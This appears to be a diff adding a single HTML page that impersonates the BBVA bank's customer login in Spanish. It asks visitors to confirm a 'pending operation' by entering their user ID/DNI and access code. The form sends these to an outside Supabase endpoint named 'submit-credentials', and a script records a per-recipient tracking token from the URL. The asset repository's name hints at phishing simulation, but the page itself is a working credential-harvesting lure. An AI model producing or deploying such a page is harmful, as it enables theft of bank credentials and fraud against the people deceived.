@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>BBVA · Acceso clientes</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f4f4f4;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;color:#121212;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:420px;padding:36px 32px;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
+  .logo{height:36px;margin-bottom:24px}
+  h1{font-weight:300;font-size:24px;margin:0 0 8px;color:#004481}
+  .sub{font-size:14px;color:#666;margin:0 0 28px}
+  label{display:block;font-size:13px;color:#666;margin:0 0 6px}
+  input{width:100%;padding:12px 14px;font-size:16px;border:1px solid #c4c4c4;border-radius:2px;outline:none;font-family:inherit;margin-bottom:18px}
+  input:focus{border-color:#004481}
+  button{display:block;width:100%;background:#004481;color:#fff;border:none;padding:14px;font-size:15px;font-weight:600;border-radius:2px;cursor:pointer;font-family:inherit;margin-top:8px}
+  button:hover{background:#003366}
+  .hint{font-size:12px;color:#666;margin-top:18px;text-align:center}
+  a{color:#004481;text-decoration:none}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/bbva.png" alt="BBVA">
+  <h1>Acceso clientes</h1>
+  <p class="sub">Confirma la operación pendiente con tus credenciales habituales.</p>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <label>Usuario o DNI</label>
+    <input type="text" name="usuario_o_dni" required autofocus>
+    <label>Clave de acceso</label>
+    <input type="password" name="clave" required inputmode="numeric" maxlength="8">
+    <button type="submit">Entrar</button>
+  </form>
+  <p class="hint"><a href="#">¿Has olvidado tu clave?</a></p>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
